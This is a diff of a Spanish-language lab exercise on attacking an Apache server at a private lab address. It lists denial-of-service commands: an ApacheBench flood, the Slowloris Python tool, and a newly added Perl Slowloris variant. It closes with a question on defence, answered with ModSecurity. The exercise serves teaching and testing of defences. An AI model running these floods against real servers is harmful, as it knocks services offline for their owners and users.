@@ -213,13 +213,19 @@ Ataque un servidor apache instalado en algunas de las máquinas del laboratorio 
 
 > `ab -n 10000 -c 10000 http://10.11.49.55/`
 
-3. Slowloris
+3. Slowloris Python
 
 > `git clone https://github.com/gkbrk/slowloris.git`
 
 > `cd slowloris`
 
 > `python3 slowloris.py 10.11.49.55 -s 500`
+
+4. Slowlori Perl
+
+Crear archivo slowlorys.pl y copiar contenido de [aqui](https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl)
+
+> perl slowloris.pl -dns 10.11.49.55
 
 1. ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
 > Con un firewall de aplicaciones web como modsecurity.
